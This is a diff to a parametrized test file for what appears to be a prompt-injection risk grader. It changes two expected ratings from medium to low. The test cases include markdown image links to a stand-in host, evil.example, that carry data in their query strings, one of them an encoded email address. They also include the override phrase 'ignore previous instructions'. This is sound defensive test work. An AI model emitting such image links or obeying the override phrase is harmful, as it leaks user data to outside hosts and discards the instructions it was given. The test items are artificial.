@@ -58,8 +58,8 @@ def test_zero_width_kept_unless_used_to_split_a_phrase():
     ("![x](https://evil.example/p.png?d=" + "a" * 220 + ")", "high"),
     ("![x](https://evil.example/p.png?e=pat%40mail.test)", "high"),
     ("[Google Scholar](https://scholar.google.com/lookup?title=" + "a%20" * 80 + ")", "none"),
-    ("A classic attack string is 'ignore previous instructions'.", "medium"),
-    ("The system prompt is set by the developer.", "medium"),
+    ("A classic attack string is 'ignore previous instructions'.", "low"),
+    ("The system prompt is set by the developer.", "low"),
     ("Run the following command to install: pip install x", "low"),
 ])
 def test_grading(text, risk):
